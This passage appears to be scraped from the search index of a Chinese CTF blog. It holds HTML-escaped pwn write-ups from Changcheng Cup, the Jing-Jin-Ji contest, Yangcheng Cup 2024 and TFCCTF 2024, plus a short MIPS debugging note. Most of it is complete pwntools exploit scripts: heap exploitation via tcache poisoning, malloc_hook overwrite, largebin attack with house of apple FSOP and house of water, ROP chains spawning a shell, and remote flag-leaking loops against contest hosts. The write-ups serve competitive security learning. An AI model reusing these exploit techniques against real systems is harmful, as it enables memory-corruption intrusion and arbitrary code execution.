    r.sendline(str(idx).encode())


def show(idx):
    cmd(4)
    r.recvuntil(b&amp;quot;Which block&#39;s secrets would you like to uncover? Enter the index (0-19): &amp;quot;)
    r.sendline(str(idx).encode())


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(3)
    r.recvuntil(b&#39;Which block would you like to rewrite? Enter the index (0-19): &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;bytes):\n&#39;)
    r.send(content)


def exit():
    cmd(5)

add(0x20,b&#39;a&#39;)#0
add(0x20,b&#39;a&#39;)#1
add(0x418,b&#39;a&#39;)#2
add(0x418,b&#39;a&#39;)#3
add(0x418,b&#39;a&#39;)#4
add(0x418,b&#39;a&#39;)#5
free(2)
show(2)
r.recvuntil(&amp;quot;Revealing the contents of block [2]:\n&amp;quot;)
libcbase = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 2018272
print(&amp;quot;libc = &amp;quot;,hex(libcbase))
free(0)
free(1)
show(1)
r.recvuntil(&amp;quot;Revealing the contents of block [1]:\n&amp;quot;)
heap_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x6c0 + 1056
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))

hook = libcbase + libc.sym[&amp;quot;__malloc_hook&amp;quot;]
edit(1,p64(hook))
add(0x20,b&#39;a&#39;)#6
add(0x20,p64(libcbase + one[1]))#7
cmd(1)
print(&amp;quot;hook = &amp;quot;,hex(hook))
# dbg()
r.recvuntil(b&#39;Enter the size of the block you wish to summon (1 to 1280 bytes): &#39;)
r.sendline(str(0x30).encode())

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;consumption&#34;&gt;consumption&lt;/h1&gt;
&lt;p&gt;一道cJSON解析的堆题，拷打gpt后可以整出交互数据结构&lt;img src=&#34;https://l1u66.github.io//post-images/1726043609017.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;这里的a3是与s偏移0x500的v13变量，sccanf函数可以把a1写入到v13指向的地址中去，程序是32位的，正好以%d的形式可以写入一个地址，攻击思路是在heap_list中写入printf的got表，从而泄露出libc，通过edit将free_got修改成system，free一个带/bin/sh的堆块即可得到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
elf = ELF(&#39;./pwn&#39;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

one = [0xe6aee, 0xe6af1, 0xe6af4]

# {&amp;quot;choice&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;idx&amp;quot;:0,&amp;quot;size&amp;quot;:&amp;quot;0x60&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;aaaa&amp;quot;}



def dbg():
    gdb.attach(r)


def add(size, content):   # 不超过0x400  下标从0开始
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(b&#39;{&amp;quot;choice&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;idx&amp;quot;:0,&amp;quot;size&amp;quot;:&amp;quot;&#39; + bytes(str(size),encoding=&amp;quot;utf-8&amp;quot;) + b&#39;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&#39; + content + b&#39;&amp;quot;}&#39;)

def delete(idx):
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(&#39;{&amp;quot;choice&amp;quot;:&amp;quot;2&amp;quot;,&amp;quot;idx&amp;quot;:&#39; + str(idx) + &#39;,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;quot;}&#39;)


def show(idx):
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(&#39;{&amp;quot;choice&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;idx&amp;quot;:&#39; + str(idx) + &#39;,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;quot;}&#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    r.sendlineafter(b&amp;quot;5.exit\t\n&amp;quot;,b&#39;{&amp;quot;choice&amp;quot;:&amp;quot;4&amp;quot;,&amp;quot;idx&amp;quot;:1,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&#39; + content + b&#39;&amp;quot;}&#39;)


heaplist=0x08051B10
add(8,b&amp;quot;/bin/sh&amp;quot;)
add(elf.got[&amp;quot;printf&amp;quot;], b&amp;quot;A&amp;quot;*0x4cc + p32(heaplist + 4))
show(1)
r.recv(0x8)
libc.address = u32(r.recv(4)) - libc.sym[&amp;quot;printf&amp;quot;]
print(&amp;quot;libc.address = &amp;quot;,hex(libc.address))

system = libc.sym[&amp;quot;system&amp;quot;]

edit(1,b&amp;quot;A&amp;quot; * 4 + p32(system))

delete(0)

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">第四届“长城杯”网络安全大赛 暨京津冀网络安全技能竞赛（初赛）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/"" data-c="
          &lt;h1 id=&#34;leak&#34;&gt;leak&lt;/h1&gt;
&lt;p&gt;程序把flag文件打开，然后一字节一字节比对，匹配一字节之后才会读下一个，读取的位置和输入的数据挨着，后面可以直接带出来，后面就是一字节一字节得泄露，&lt;s&gt;垃圾环境，整一堆垃圾数据不知道干啥，另一队死活打不出来&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

flag = b&amp;quot;flag{&amp;quot;

while(1):
    print(&amp;quot;flag : {}&amp;quot;.format(flag))
    p = remote(&amp;quot;119.23.41.54&amp;quot;,35432)
    # p = process(&amp;quot;./leak&amp;quot;)
    pay = flag.ljust(40,b&#39;c&#39;)
    p.sendlineafter(&amp;quot;What&#39;s your name?&amp;quot;,pay)
    # gdb.attach(p)
    p.sendlineafter(&amp;quot;Please give me your flag:&amp;quot;,pay)
    p.recvuntil(&amp;quot;Sorry &amp;quot;)
    p.recv(40)
    flag += p.recv(1)
    print(flag)
    # flag += chr(j)
    # print(&amp;quot;flag : &amp;quot;,flag)
    # log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
    p.close()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;likeputs&#34;&gt;likeputs&lt;/h1&gt;
&lt;p&gt;栈溢出签到题&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = remote(&amp;quot;119.23.41.54&amp;quot;,34005)
system = 0x000000000400540
cmd = 0x000000000400797
rdi = 0x0000000000400753
ret = 0x0000000000400506
p.sendafter(&amp;quot;cat flag\n&amp;quot;,b&#39;a&#39;*32 + p64(0) + p64(rdi) + p64(cmd) + p64(ret) + p64(system))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;condition&#34;&gt;Condition&lt;/h1&gt;
&lt;p&gt;条件竞争....free置零操作在sleep后，可以设法构造uaf，本地泄露出来heap基地址了，远端泄露不出来，还不给远端liibc版本，无敌了&lt;/p&gt;
">2024年京津冀大学生信息安全网络攻防大赛（首届）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/yang-cheng-bei-2024/"" data-c="
          &lt;p&gt;比赛这天杂事有点多，整个下午没打成，只看了两道题，出了一道，另一道本地通了，远端一到最后输入伪造的io时挂掉，猜测是因为输入缓冲区被填满导致提前flush了，下面给出的是赛后改善后的exp，可惜没有环境检验哩(悲&lt;/p&gt;
&lt;h1 id=&#34;pstack&#34;&gt;pstack&lt;/h1&gt;
&lt;p&gt;pwn的签到题，溢出16字节的栈迁移&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;)

p = process(&#39;./pwn&#39;)
#p = remote(&amp;quot;139.155.126.78&amp;quot;,32231)
elf = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc.so.6&#39;)

bss = 0x000000000601010 + 0x800
leave_ret = 0x00000000004006da
vuln = 0x0000000004006C4
pop_rdi_ret = 0x0000000000400773
read_got = 0x000000000600FD8
puts_plt = 0x000000000400520
ret = 0x0000000000400506

gdb.attach(p)
payload = b&#39;a&#39; * 48 + p64(bss + 0x30) + p64(vuln)
p.sendafter(&amp;quot;overflow?\n&amp;quot;,payload)


payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln) + p64(0) + p64(0x601810) + p64(leave_ret)
p.send(payload)

read_addr = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))

libc_base = read_addr - libc.symbols[&#39;read&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;read = &amp;quot;,hex(libc.symbols[&#39;read&#39;]))
one = [0xebc81, 0xebc85, 0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]

payload = b&#39;a&#39; * 48 + p64(bss - 0x100 + 0x30) + p64(vuln)
p.send(payload)
payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(system_addr) + p64(vuln) + p64(0) + p64(bss - 0x100) + p64(leave_ret)
p.send(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;travelgraphorw的house-of-apple&#34;&gt;TravelGraph(orw的house of apple)&lt;/h1&gt;
&lt;p&gt;漏洞点是uaf，增删改查都有，但是edit只能用一次还得绕过一个检查，正好用来largebin attack&lt;br&gt;
add可以申请0x510,0x520,0x530的堆块，出来的chunk长这样&lt;img src=&#34;https://l1u66.github.io//post-images/1725027045497.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
每个功能都是通过起始地和终点的数字来查找的，但是free后此区域会被覆盖，所以我利用uaf的方法是unsortedbin的chunk分割，从而伪造起始地，终点，far和工具，并且注意，edit的长度是根据工具的数字计算的，所以可以通过伪造工具的数字实现一次很大的堆溢出，后面就是largebin attack+house of apple了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
#r = remote(&amp;quot;139.155.126.78&amp;quot;,37421)
e = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22打本地

city = [b&amp;quot;guangzhou&amp;quot;, b&amp;quot;nanning&amp;quot;, b&amp;quot;changsha&amp;quot;, b&amp;quot;nanchang&amp;quot;, b&amp;quot;fuzhou&amp;quot;]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;5. Calculate the distance.\n&#39;)
    r.sendline(str(choice).encode())


def add1(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;car&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)

def add2(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;train&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)

def add3(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;plane&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)


def delete(start, stop):
    cmd(2)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])


def show(start, stop):
    cmd(3)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])


def edit(start, stop, dis, content):
    cmd(4)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;Which one do you want to change?\n&#39;)
    r.sendline(b&#39;0&#39;)
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)


def exit():
    cmd(5)
#   x/20gx  &amp;amp;routes
add1(1,1,1000,b&#39;flag\x00\x00\x00\x00&#39;)#1
add3(1,2,1000,b&#39;a&#39;)#2
add1(2,2,1000,b&#39;a&#39;)#3
delete(1,1)
add2(2,4,1000,b&#39;a&#39;)#4
add1(1,1,1000,b&#39;\x70&#39;)#5
show(1,1)
r.recvuntil(&amp;quot;Note:&amp;quot;)
heap_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1470
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))
delete(1,1)
delete(1,2)
add1(1,3,1000,b&#39;a&#39;)#1
delete(1,3)
add3(1,4,1000,b&#39;b&#39;*0x510)#1
show(1,4)
r.recvuntil(&amp;quot;Note:&amp;quot;)
r.recv(0x510)
libc_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 2206944
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

delete(1,4)
add3(2,3,1000,b&#39;a&#39;*0x508 + p64(0x541) + p32(0) + p32(3) + p32(0x800) + p32(1000))#1
cmd(5)
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(b&#39;nanchang&#39;)
add1(4,4,1000,b&#39;k&#39;)#1
add3(1,1,1000,b&#39;flag\x00\x00\x00\x00&#39;)#1

IO_list_all=libc_base+libc.symbols[&#39;_IO_list_all&#39;]
magic_gadget=libc_base+0x000000000016a06a
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
leave_ret=libc_base+0x000000000004da83
add_rsp_ret = libc_base+0x0000000000125b80
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f2e7
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029139
syscall=libc_base+0x0000000000029db4
read_addr=libc_base+libc.symbols[&#39;read&#39;]
write_addr=libc_base+libc.symbols[&#39;write&#39;]
puts_addr=libc_base+libc.symbols[&#39;puts&#39;]
open_addr=libc_base+libc.symbols[&#39;open&#39;]

fake_io_file_addr = heap_base + 6576
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
system = libc_base + libc.sym[&#39;system&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
lock = libc_base+0x1ee7d0

orw_addr = fake_io_file_addr + 632
#open orw_addr+16
orw = b&#39;flag\x00\x00\x00\x00&#39;
orw += p64(add_rsp_ret) + p64(add_rsp_ret) + p64(orw_addr-8) + p64(0) + p64(leave_ret) + p64(0)
orw += p64(pop_rdx_r12) + p64(0) + p64(fake_io_file_addr - 0x10)#fake io addr
orw += p64(pop_rdi) + p64(orw_addr+16-24)
orw += p64(pop_rsi) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(open_addr)
#read
orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw_addr + 0x100)
orw += p64(pop_rdx_r12) + p64(0x50) + p64(0)
orw += p64(read_addr)
#puts
orw += p64(pop_rdi) + p64(orw_addr + 0x100)
orw += p64(puts_addr)

fake_io_file = p64(2206944+libc_base)*2 + p64(1) + p64(2) + p64(0)*3 + p64(orw_addr-8)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fake_io_file_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(_IO_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(fake_io_file_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(magic_gadget)
fake_io_file += orw


add1(3,3,1000,b&#39;a&#39;)#1
add1(3,4,1000,b&#39;a&#39;)#1
delete(2,4)
add3(1,1,1000,b&#39;a&#39;)#1
delete(4,4)


cmd(4)
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(city[0])
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(city[3])
r.recvuntil(b&#39;Which one do you want to change?\n&#39;)
r.sendline(b&#39;0&#39;)
r.recvuntil(b&#39;How far?\n&#39;)
r.sendline(b&#39;0&#39;)
r.recvuntil(b&#39;Note:\n&#39;)
r.send(p64(0) + p64(0x521) + fake_io_file.ljust(0x510,b&#39;\x66&#39;) + p64(0x520) + p64(0x520) + b&#39;c&#39;*0x518 + p64(0x531) + p64(2208016 + libc_base)*2 + p64(9200 + heap_base) + p64(IO_list_all - 0x20))#
# r.send(p64(0) + p64(0x521) + b&#39;b&#39;*0x518 + p64(0x521) + b&#39;c&#39;*0x518 + p64(0x531) + p64(0)*3 + p64(IO_list_all - 0x20) + b&#39;c&#39;*0x500 + p64(0x530) + p64(0x540) + b&#39;d&#39;*0x530 + b&amp;quot;  sh;&amp;quot; )
add3(1,1,1000,b&#39;a&#39;)#1
print(&amp;quot;IO_list_all = &amp;quot;,hex(IO_list_all))
print(&amp;quot;magic_gadget = &amp;quot;,hex(magic_gadget))
print(&amp;quot;leave_ret = &amp;quot;,hex(leave_ret))

# gdb.attach(r)


r.recvuntil(b&#39;5. Calculate the distance.\n&#39;)
r.sendline(str(7).encode())
r.interactive()

# + p64(2208016 + libc_base)*2 + p64(6576 + heap_base) + p64(IO_list_all - 0x20)
&lt;/code&gt;&lt;/pre&gt;
">羊城杯2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/"" data-c="
          &lt;p&gt;gdb-multiarch安装&lt;br&gt;
&lt;code&gt;sudo apt-get install gdb-multiarch&lt;/code&gt;&lt;br&gt;
开终端&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;qemu-mipsel -g 1234 ./subcall_stack
或
qemu-mipsel -g 1234 -L mipsel-linux-gnu ./subcall_stack			# -L 指定动态库
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另起终端&lt;br&gt;
进入gdb-multiarch调试（pwndbg）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gdb-multiarch ./subcall_stack
pwndbg&amp;gt; set architecture mips
The target architecture is assumed to be mips
pwndbg&amp;gt; target remote localhost:1234
&lt;/code&gt;&lt;/pre&gt;
">mips异架构调试</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/tfcctf2024/"" data-c="
          &lt;p&gt;打的第一场国外的比赛，从易到难&lt;/p&gt;
&lt;h1 id=&#34;guard-the-bypass&#34;&gt;GUARD-THE-BYPASS&lt;/h1&gt;
&lt;p&gt;该题逻辑很简单，就是创建了一个新进程，新进程中有一个可以自定义长度输入的栈溢出，程序还开了canary，由于程序只有一个read，所以泄露canary不太可能，溢出长度自定，所以可以溢出到fs段改写canary，唯一注意的点是覆写的canary需要是个可写的地址（调试出来的），后面就是正常的栈溢出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
#io = remote(&#39;challs.tfcctf.com&#39;,31940)
io = process(&amp;quot;./guard&amp;quot;)
elf = ELF(&amp;quot;./guard&amp;quot;)
libc = elf.libc
#io = remote(&amp;quot;&amp;quot;,)

io.sendlineafter(b&#39;chall.\n&#39;,b&#39;1&#39;)
io.sendlineafter(b&#39;len: &#39;,b&#39;10000&#39;)

puts_plt = 0x0000000004010D0
puts_got = 0x000000000404018
rdi_ret = 0x0000000000401256
ret = 0x000000000040101a
data = 0x404280
d = p64(data)*7 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x00000000040136F)
d += ((0x850 - len(d))//8) * p64(data)
io.sendline(d)

ogg = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
puts = u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
libc_base = puts - libc.sym[&#39;puts&#39;]
print(&amp;quot;libc_base&amp;quot;,hex(libc_base))

d = p64(data)*7 + p64(ret) + p64(libc_base + ogg[5])
io.sendline(d)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;vspmoff-by-one&#34;&gt;VSPM(off by one)&lt;/h1&gt;
&lt;p&gt;&lt;s&gt;看题目还以为是VM&lt;/s&gt;结果是个2.30的堆，具有add,delete,show功能，漏洞点在add功能，可以多输入一个字节,可以做到堆重叠，这版本还有hook，好打的一批&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./chall&amp;quot;)
#p = remote(&#39;challs.tfcctf.com&#39;,32662)
elf = ELF(&amp;quot;./chall&amp;quot;)

def add(size,content1=b&#39;\x00&#39;,content2=b&#39;\x00&#39;):
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;length: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;credentials: &amp;quot;)
	p.send(content1)
	p.recvuntil(&amp;quot;credentials: &amp;quot;)
	p.send(content2)
    
def dele(idx):
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;index: &amp;quot;)
	p.sendline(str(idx))
	
def show():
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)

def exit():
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0x78)#0
add(0x78)#1
add(0x68)#2
add(0x78)#3
dele(0)
pay = b&#39;a&#39;*0x78 + p8(0xf1)
add(0x78,pay)
dele(1)
add(0x78)#0
show()
p.recv(0x91)
main = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
base = main - 3886016
print(hex(main))
add(0x68)#1
dele(0)
dele(2)
pay = b&#39;a&#39;*0x78 + p8(0xf1)
add(0x78,pay)
dele(1)
add(0x58,b&#39;a&#39;*0x58)

onegadget = [0xc4dbf,0xc4ddf,0xc4de6,0xe1fa1]
one_gadget = base + onegadget[3]
malloc_hook = main - 88 - 0x18
fake_fast = malloc_hook - 35
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
print(&amp;quot;base = &amp;quot;,hex(base))
print(&amp;quot;fake_fast = &amp;quot;,hex(fake_fast))
add(0x48,b&#39;b&#39;*24 + p64(0x71) + p64(fake_fast))
add(0x68)
payload = b&#39;\x00&#39;*19 + p64(one_gadget)
add(0x68,payload)
p.recvuntil(&amp;quot;Input: &amp;quot;)
p.sendline(&amp;quot;1&amp;quot;)
#gdb.attach(p)	#----------------------------------------------------------------------------
p.recvuntil(&amp;quot;length: &amp;quot;)
p.sendline(str(0x18))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;mcguavahouse-of-water&#34;&gt;MCGUAVA（house of water）&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-282792.htm#msg_header_h3_4&#34;&gt;学习链接&lt;/a&gt;&lt;br&gt;
重量级来了，真牛批一题，重点分析!!!&lt;br&gt;
先看功能&lt;br&gt;
add:&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723130644373.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以分配不超过255个堆块，堆块大小必须小于0x6FF，可以在申请的堆块内任意地址写&lt;br&gt;
delete:&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723130760369.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
存在UAF漏洞，然后就没了......&lt;br&gt;
整个程序只有个UAF，还只有add和delete功能，&lt;s&gt;这写集贸啊&lt;/s&gt;，这时就要用到house of water了&lt;/p&gt;
&lt;h2 id=&#34;思考&#34;&gt;思考：&lt;/h2&gt;
&lt;p&gt;首先如果要拿到shell或flag，前提是知道libc地址，但是程序没有任何可以泄露地址的功能，所以就想到劫持stdout结构体，但是问题来了，劫持也需要libc地址，所以想到用unsortedbin中的指针残余来得到stdout，低三位是已知的，所以需要爆破第四位，1/16的概率，所以就想如何能够使bin链中存在stdout的地址，house of water给我们提供了一个方法&lt;br&gt;
众所周知，tcache_perthread_struct 结构体中存放着tcachebin中每一条链表的元素个数和链表头，当你&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    add(0x3e8)#0
    add(0x3d8)#1
    free(0)
    free(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tcache_perthread_struct 中会出现&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723135416882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723132353878.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里以0x30为例，前面可以利用UAF保存到0x5b0142ea8730指针，free后tcache_perthread_struct中的0x30大小的位置就被写上了0x5b0142ea8730，后面就是设法在unsortedbin中构造这样的结构A-&amp;gt;B-&amp;gt;C，B应该就是0x10001这个chunk，需要构造C的bk和A的fd指向那个chunk，在free时已经使B有了fd和bk指针，fd指针即0x5b0142ea8730，所以需要在0x5b0142ea8730处构造一个unsorted大小的chunk，此处又有一个知识点，就是在tcachebin中的指针指向的是chunk的内容，即malloc返回的值，在unsortedbin等其他bin中保存的是chunk的头指针，所以如果要在0x5b0142ea8730处构造一个unsorted大小（0x10000-0x17ff0范围以外）的chunk就要想办法free(0x5b0142ea8740)，前提是把0x5b0142ea8738的位置写入一个unsortedbin大小范围内的size值，并且这个size还要合法，即该chunk的地址加上size需要是另一个chunk头，并且这个另一个chunk的size的末尾需要是1，表明这个chunk没被释放过，利用UAF实现堆覆盖可以成功构造，这里也是第四位需要爆破，1/16的概率，构造成功的效果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723133842161.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里的0x615c78e5c080即那个0x10001大小的chunk，此时再随便申请一个大小的堆块，便可以把这个大chunk整到largebin中，使原来的fd和bk指针变为和libc有关的地址&lt;img src=&#34;https://l1u66.github.io//post-images/1723134055275.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;此时在这个大堆中申请堆块即可控制tcache_perthread_struct实现任意地址分配，此时爆破stdout的地址，使能够分配到stdout结构体，实现劫持泄露libc地址，由于程序有exit（0）的功能，可以打FSOP，有了libc地址后就可以通过劫持stderr拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

 
def meau(index):
    p.recvuntil(&#39;*&amp;gt;&#39;,timeout = 1)
    p.sendline(str(index))
 
def add(size,index=0,content=b&#39;a&#39;):#0x1790
    meau(1)
    p.recvuntil(&#39;how many guavas:&#39;)
    p.sendline(str(size))
    p.recvuntil(&#39;guavset:&#39;,timeout=1)
    p.sendline(str(index))
    p.recvuntil(&#39;guavas:&#39;)
    p.send(content)
 
